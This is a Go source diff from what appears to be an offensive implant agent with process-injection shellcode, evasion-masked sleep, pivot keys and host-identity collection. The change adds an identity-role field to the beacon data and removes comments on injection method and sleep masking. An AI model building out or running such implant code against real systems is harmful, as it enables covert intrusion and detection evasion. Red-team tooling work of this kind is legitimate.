@@ -82,13 +82,10 @@ var (
 	PivotPrivKeyB64 string
 	PivotPubKeyB64  string
 
+	IdentityRole string
+
 	InjectorShellcodeB64 string
 
-	// InjectMethodDefault is set at build time via
-	// -X main.InjectMethodDefault=<name>. Empty or "default"
-	// selects the historical CreateRemoteThread / ptrace
-	// backend. "apc" selects remote APC injection on Windows;
-	// it is refused on Linux by inject_linux.go.
 	InjectMethodDefault string
 
 	DefaultSleepSeconds    int     = 60
@@ -183,6 +180,7 @@ func Main(cfg Config) {
 
 	PivotPrivKeyB64 = cfg.PivotPrivKeyB64
 	PivotPubKeyB64  = cfg.PivotPubKeyB64
+	IdentityRole    = cfg.IdentityRole
 
 	InjectorShellcodeB64 = cfg.InjectorShellcodeB64
 	InjectMethodDefault  = cfg.InjectMethod
@@ -2018,15 +2016,6 @@ func (a *Agent) sleep() {
 		ms := uint32(total.Milliseconds())
 		diag("[sleep] attempting masked sleep type=%q %dms\n",
 			SleepMaskType, ms)
-		// The masked sleep is a single syscall and cannot
-		// be interrupted by the kill deadline the way the
-		// plaintext loop can. A deadline that fires inside
-		// the sleep window is honoured on the next run-loop
-		// iteration, so the effective overshoot is bounded
-		// by the current sleep interval, not by the 30 s
-		// polling step. A build with a short kill deadline
-		// and a sleep mask should use a short sleep interval
-		// if the deadline matters more than the sleep.
 		if err := evasion.MaskedSleep(SleepMaskType, ms); err != nil {
 			diag("[sleep] mask failed: %v — refusing to sleep "+
 				"in plaintext; exiting\n", err)
@@ -2061,16 +2050,23 @@ func GatherIdentity(cfg Config) protocol.Identity {
 	if u, err := user.Current(); err == nil {
 		username = u.Username
 	}
+
+	role := cfg.IdentityRole
+	if role == "" {
+		role = IdentityRole
+	}
+
 	return protocol.Identity{
-		Hostname:  hostname,
-		Username:  username,
-		MachineID: platform.MachineID(),
-		OS:        runtime.GOOS,
-		Arch:      runtime.GOARCH,
-		Proto:     1,
-		KillDays:  cfg.KillDays,
-		WorkStart: cfg.WorkHoursStart,
-		WorkEnd:   cfg.WorkHoursEnd,
+		Hostname:     hostname,
+		Username:     username,
+		MachineID:    platform.MachineID(),
+		OS:           runtime.GOOS,
+		Arch:         runtime.GOARCH,
+		Proto:        1,
+		KillDays:     cfg.KillDays,
+		WorkStart:    cfg.WorkHoursStart,
+		WorkEnd:      cfg.WorkHoursEnd,
+		IdentityRole: role,
 	}
 }
 
